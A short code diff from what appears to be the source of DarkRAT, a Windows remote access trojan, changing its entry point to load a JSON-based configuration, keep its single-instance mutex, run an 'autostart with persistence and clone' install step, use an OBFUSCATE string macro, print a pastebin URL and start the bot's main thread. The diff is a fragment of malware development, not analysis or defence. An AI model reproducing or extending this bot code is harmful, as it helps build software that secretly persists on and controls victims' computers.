@@ -9,7 +9,9 @@
 #include <thread>
 #include <ShellAPI.h>
 #include <wbemidl.h>
-#include "config.h"
+#include <list>
+#include "BuildSystem\json.h"
+#include "BuildSystem\config.h"
 #include <conio.h>
 #include "obfuscat.h"
 #include "URL.h"
@@ -46,8 +48,8 @@ int main(int argc, char* argv[]) {
 #if NDEBUG 
 int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, char*, int nShowCmd) {
 #endif
-
-		Config config;
+		darkRat::config::config config = darkRat::config::load();
+		//Config config;
 		std::thread darkMain;
 
 		//Check if the Bot is Running
@@ -57,14 +59,21 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, char*, int nShowCmd) {
 			return -1; // quit; mutex is released automatically
 
 		//Autostart  (with persistence) && Clone
-		if (config.startup == true) {
+		if (config.startup == "true") {
 			std::string insatlled = Helpers::installedOrnot();
 			if (insatlled == OBFUSCATE("restart")) {
 				return 0;
 			}
 		}
 
+		std::cout << " WTF:" << config.pastebinUrl << std::endl;
+		//system("pause");
 		darkMain = std::thread(Client::darkMainThread);
 		darkMain.join();
-
+		/*
+		while (true)
+		{
+			Sleep(1000000);
+		}
+		*/
 }
